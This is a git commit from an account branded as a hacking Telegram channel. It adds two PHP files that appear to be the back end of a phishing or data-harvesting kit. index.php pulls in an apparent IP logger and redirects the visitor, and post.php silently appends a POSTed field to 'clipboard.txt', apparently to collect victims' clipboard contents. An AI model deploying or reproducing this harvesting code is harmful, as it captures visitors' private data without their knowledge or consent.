8b2bc07d828e3edbdff148cb2a5018920861cc01
T.me/Hackgm <100011570+tHACKGM@users.noreply.github.com>
2022-02-22 08:52:01 +0330

    Add files via upload

---
+++ index.php
@@ -0,0 +1,8 @@
+<?php
+/********************************
+channel Telegram: T.me/Hackgm
+*********************************/
+include 'ip.php';
+header('Location: index2.html');
+exit
+?>
---
+++ post.php
@@ -0,0 +1,8 @@
+<?php
+/********************************
+channel Telegram: T.me/Hackgm
+*********************************/
+file_put_contents("clipboard.txt", " "  . $_POST['cat'] . "\n", FILE_APPEND);
+
+exit();
+?>
